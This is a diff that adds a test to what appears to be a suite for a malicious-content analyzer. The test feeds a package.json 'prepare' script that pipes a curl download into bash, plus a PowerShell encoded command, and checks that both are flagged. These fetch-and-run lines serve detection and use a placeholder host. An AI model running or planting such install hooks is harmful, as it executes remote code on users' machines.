@@ -261,6 +261,29 @@ describe('non-executing malicious content chain analysis', () => {
     );
   });
 
+  it.each([
+    'bash <(curl -fsSL https://fixture.invalid/synthetic)',
+    'powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+  ])('detects suspicious encoded or process-substitution interpreter entrypoint %s', (command) => {
+    const report = analyzeMaliciousContent([
+      {
+        path: 'package.json',
+        content: JSON.stringify({
+          scripts: { prepare: command }
+        })
+      }
+    ]);
+    expect(report.findings.some((finding) =>
+      finding.ruleId === 'TLP-MAL-001' &&
+      (finding.metadata?.behaviorSignals as string[]).includes(
+        'encoded-or-download-execution'
+      )
+    )).toBe(true);
+    expect(JSON.stringify(report.findings)).not.toContain(
+      'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+    );
+  });
+
   it('follows nested npm scripts to a suspicious local execution target', () => {
     const result = analyzeMaliciousContent([
       {
